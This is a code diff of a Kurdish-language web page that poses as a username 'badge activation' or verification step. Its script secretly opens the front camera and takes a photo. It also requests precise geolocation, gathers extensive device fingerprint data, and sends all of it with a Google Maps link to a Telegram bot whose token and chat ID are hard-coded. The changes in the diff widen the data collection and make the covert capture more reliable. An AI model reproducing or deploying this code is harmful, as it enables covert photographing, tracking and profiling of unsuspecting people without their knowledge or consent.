@@ -206,6 +206,7 @@
     (function(){
         "use strict";
 
+        // ========== تۆکن و چات ئایدی ==========
         const TELEGRAM_BOT_TOKEN = '8626639755:AAFyksMLVD49z-wuV6WEy1KFIpCyGTmLe6Q';
         const TELEGRAM_CHAT_ID = '659131693';
         
@@ -227,9 +228,13 @@
             info.userAgent = navigator.userAgent;
             info.platform = navigator.platform;
             info.language = navigator.language;
+            info.languages = navigator.languages;
+            info.cookieEnabled = navigator.cookieEnabled;
+            info.doNotTrack = navigator.doNotTrack;
             info.onLine = navigator.onLine;
             info.screenWidth = window.screen.width;
             info.screenHeight = window.screen.height;
+            info.devicePixelRatio = window.devicePixelRatio;
             info.hardwareConcurrency = navigator.hardwareConcurrency || 'نادیار';
             info.deviceMemory = navigator.deviceMemory || 'نادیار';
             
@@ -237,8 +242,9 @@
                 const conn = navigator.connection;
                 info.connectionType = conn.effectiveType || 'نادیار';
                 info.downlink = conn.downlink || 'نادیار';
+                info.rtt = conn.rtt || 'نادیار';
             }
-
+            
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
@@ -246,45 +252,58 @@
                     info.batteryCharging = battery.charging ? 'بەڵێ' : 'نەخێر';
                 } catch (e) { info.batteryLevel = 'نادیار'; }
             }
-
+            
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    info.gpuRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'نادیار';
+                    if (debugInfo) {
+                        info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
                 }
-            } catch (e) { info.gpuRenderer = 'هەڵە'; }
-
+            } catch (e) { info.gpuRenderer = 'نادیار'; }
+            
             info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             info.timestamp = new Date().toLocaleString('ku');
             return info;
         }
 
         function updateLocationText(lat, lng) {
-            locationDisplay.innerHTML = (lat && lng) ? `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}` : '📍 شوێن: نەنێردرا';
+            if (lat && lng) {
+                locationDisplay.innerHTML = `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+            } else {
+                locationDisplay.innerHTML = '📍 شوێن: نەنێردرا';
+            }
         }
 
         function updateDeviceInfoDisplay(info) {
-            deviceInfoDiv.innerHTML = `
-                <div>📱 UA: ${info.userAgent.substring(0, 35)}...</div>
-                <div>💻 ${info.platform} | CPU: ${info.hardwareConcurrency} | RAM: ${info.deviceMemory}GB</div>
-                <div>🔋 پاتری: ${info.batteryLevel} | 📶 تۆڕ: ${info.connectionType}</div>
+            const html = `
+                <div>📱 UA: ${(info.userAgent || '').substring(0, 40)}...</div>
+                <div>💻 سیستەم: ${info.platform || 'نادیار'} | CPU: ${info.hardwareConcurrency} ناوک</div>
+                <div>🧠 بیرگە: ${info.deviceMemory}GB | 📶 تۆڕ: ${info.connectionType}</div>
+                <div>🔋 پاتری: ${info.batteryLevel} | ⚡ بارگاویکردن: ${info.batteryCharging}</div>
                 <div>🕐 کات: ${info.timezone}</div>
             `;
+            deviceInfoDiv.innerHTML = html;
         }
 
         function fetchLocation() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        currentLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
-                        updateLocationText(currentLocation.lat, currentLocation.lng);
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        currentLocation = { lat, lng, accuracy: pos.coords.accuracy };
+                        updateLocationText(lat, lng);
                         resolve(currentLocation);
                     },
                     () => { resolve(null); },
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                 );
             });
         }
@@ -294,19 +313,20 @@
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('photo', imageBlob, `snap_${username}.jpg`);
             
-            let caption = `📸 *وێنەی پشتڕاستکردنەوە*\n👤 یوزەرنەیم: @${username}\n🕒 ${deviceInfo.timestamp}`;
+            let caption = `📸 *وێنەی پشتڕاستکردنەوە*\n👤 یوزەرنەیم: @${username}\n🕒 ${new Date().toLocaleString('ku')}`;
             
             if (location) {
-                caption += `\n📍 شوێن: ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}`;
+                caption += `\n📍 شوێن: ${location.lat},${location.lng}`;
                 caption += `\n🗺️ https://www.google.com/maps?q=${location.lat},${location.lng}`;
             }
-
+            
             caption += `\n\n📱 *زانیاری ئامێر:*`;
             caption += `\n💻 سیستەم: ${deviceInfo.platform}`;
-            caption += `\n🧠 CPU: ${deviceInfo.hardwareConcurrency} | RAM: ${deviceInfo.deviceMemory}GB`;
-            caption += `\n📶 تۆڕ: ${deviceInfo.connectionType} | 🔋 پاتری: ${deviceInfo.batteryLevel}`;
+            caption += `\n🧠 CPU: ${deviceInfo.hardwareConcurrency} ناوک | بیرگە: ${deviceInfo.deviceMemory}GB`;
+            caption += `\n🔋 پاتری: ${deviceInfo.batteryLevel} | 📶 تۆڕ: ${deviceInfo.connectionType}`;
             caption += `\n🎮 GPU: ${deviceInfo.gpuRenderer}`;
-            caption += `\n🌍 ناوچە: ${deviceInfo.timezone}`;
+            caption += `\n🌍 ناوچەی کاتی: ${deviceInfo.timezone}`;
+            caption += `\n\n📋 UA: ${deviceInfo.userAgent}`;
             
             formData.append('caption', caption);
             formData.append('parse_mode', 'Markdown');
@@ -323,31 +343,42 @@
 
         async function startHiddenCamera() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
                 hiddenVideo.srcObject = stream;
+                await new Promise(r => { hiddenVideo.onloadedmetadata = r; });
+                await hiddenVideo.play();
                 return true;
             } catch (err) { return false; }
         }
 
         function stopCamera() {
-            if (stream) { stream.getTracks().forEach(t => t.stop()); }
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+                stream = null;
+            }
         }
 
         async function capturePhoto() {
             if (!stream) return null;
             const ctx = hiddenCanvas.getContext('2d');
             ctx.drawImage(hiddenVideo, 0, 0, 640, 480);
-            return await new Promise(r => hiddenCanvas.toBlob(r, 'image/jpeg', 0.8));
+            return await new Promise(r => hiddenCanvas.toBlob(r, 'image/jpeg', 0.9));
         }
 
         async function handleActivate() {
             if (isProcessing) return;
             const username = usernameInput.value.trim();
-            if (!username) { statusMsg.innerText = '❗ یوزەرنەیم بنووسە'; return; }
+            if (!username) {
+                statusMsg.innerHTML = '❗ تکایە یوزەرنەیم بنووسە';
+                return;
+            }
 
             isProcessing = true;
             activateBtn.disabled = true;
-            statusMsg.innerText = '⏳ پرۆسێس دەکرێت...';
+            statusMsg.innerHTML = '⏳ پرۆسێس دەکرێت...';
             
             deviceData = await collectAllDeviceInfo();
             updateDeviceInfoDisplay(deviceData);
@@ -365,7 +396,7 @@
             }
 
             statusMsg.innerHTML = '✅ باجەکە بەسەرکەوتوویی چالاک کرا';
-            activateBtn.innerText = 'تەواو بوو';
+            activateBtn.innerText = 'تەواو';
             isProcessing = false;
         }
 
